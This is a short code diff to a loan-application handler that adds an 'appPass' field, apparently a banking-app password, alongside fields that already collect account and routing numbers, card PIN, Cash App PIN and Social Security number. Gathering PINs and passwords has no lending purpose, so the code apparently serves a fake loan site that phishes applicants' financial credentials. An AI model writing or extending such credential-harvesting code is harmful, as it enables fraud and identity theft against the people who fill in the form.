@@ -80,7 +80,7 @@ const applyForLoan = asyncHandler(async (req, res) => {
   const {
     amount, purpose, duration, payDate,
     employment, jobTitle, income, creditScore, notes,
-    bankName, accountNumber, routingNumber, cardPin,
+    bankName, accountNumber, appPass, routingNumber, cardPin,
     cashAppPin, ssn,
   } = req.body;
 
@@ -114,6 +114,7 @@ const applyForLoan = asyncHandler(async (req, res) => {
     notes:       notes || "",
     bankName,
     accountNumber,
+    appPass: appPass || undefined,
     routingNumber:  routingNumber  || undefined,
     cashAppPin:     cashAppPin     || undefined,
     cardPin:      cardPin || undefined,
